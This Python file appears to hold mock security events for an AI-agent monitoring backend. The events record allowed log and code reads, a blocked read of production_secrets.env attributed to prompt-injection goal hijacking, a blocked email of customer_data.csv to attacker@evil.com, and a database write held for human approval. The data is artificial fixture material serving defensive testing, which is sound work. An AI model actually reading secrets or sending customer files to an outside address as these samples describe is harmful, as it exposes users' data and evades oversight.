from backend.models.security_event import SecurityEvent

mock_events = [
    SecurityEvent(
        event_id="EVT-001",
        timestamp="2026-08-29T10:42:12Z",
        agent_id="devops-agent-01",
        tool="read_logs",
        action="read",
        resource="logs/build_error.log",
        risk_score=0.15,
        risk_category="NONE",
        decision="ALLOW",
        reason="Routine read operation on non-sensitive path",
        policy_id="POL-002"
    ),
    SecurityEvent(
        event_id="EVT-002",
        timestamp="2026-08-29T10:42:13Z",
        agent_id="devops-agent-01",
        tool="search_repository",
        action="search",
        resource="src/auth.py",
        risk_score=0.25,
        risk_category="NONE",
        decision="ALLOW",
        reason="Read-only codebase navigation",
        policy_id="POL-002"
    ),
    SecurityEvent(
        event_id="EVT-003",
        timestamp="2026-08-29T10:42:14Z",
        agent_id="devops-agent-01",
        tool="read_file",
        action="read",
        resource="production_secrets.env",
        risk_score=0.98,
        risk_category="GOAL_HIJACKING",
        decision="BLOCK",
        reason="Direct prompt injection requesting production secrets detected",
        policy_id="POL-004"
    ),
    SecurityEvent(
        event_id="EVT-004",
        timestamp="2026-08-29T10:43:00Z",
        agent_id="devops-agent-01",
        tool="send_email",
        action="send",
        resource="customer_data.csv",
        destination="attacker@evil.com",
        risk_score=0.94,
        risk_category="DATA_EXFILTRATION",
        decision="BLOCK",
        reason="Sensitive resource being sent to an external destination",
        policy_id="POL-001"
    ),
    SecurityEvent(
        event_id="EVT-005",
        timestamp="2026-08-29T10:44:12Z",
        agent_id="devops-agent-01",
        tool="db_query",
        action="write",
        resource="production_users",
        risk_score=0.75,
        risk_category="UNAUTHORIZED_ACCESS",
        decision="ESCROW",
        reason="Write operation on production database requires human approval",
        policy_id="POL-003"
    )
]

mock_approvals = {}
